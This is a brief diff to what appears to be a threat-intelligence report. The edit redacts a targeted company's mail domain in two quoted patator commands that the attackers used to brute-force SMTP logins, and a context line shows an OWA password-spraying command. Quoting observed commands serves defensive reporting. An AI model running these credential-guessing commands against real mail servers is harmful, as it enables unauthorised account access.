@@ -133,8 +133,8 @@ python3 owa.py --url https://mail.terem[.]com --username user.txt --password pas
 Furthermore, we also saw the tool [patator](https://github.com/lanjelot/patator) used in an attempt to brute-force SMTP:
 
 ```bash
-patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 -x ignore:fgrep='Authentication failed' -x ignore:fgrep='535' timeout 30
-patator smtp_login host=mail.nmdc-group[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 timeout 30
+patator smtp_login host=mail.REDACTED[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 -x ignore:fgrep='Authentication failed' -x ignore:fgrep='535' timeout 30
+patator smtp_login host=mail.REDACTED[.]com port=587 starttls=1 user=FILE0 password=FILE1 0=admins.txt 1=pass.txt -t 1 --rate-limit 1 timeout 30
 ``` 
 
 ## Fortigate Exploitation
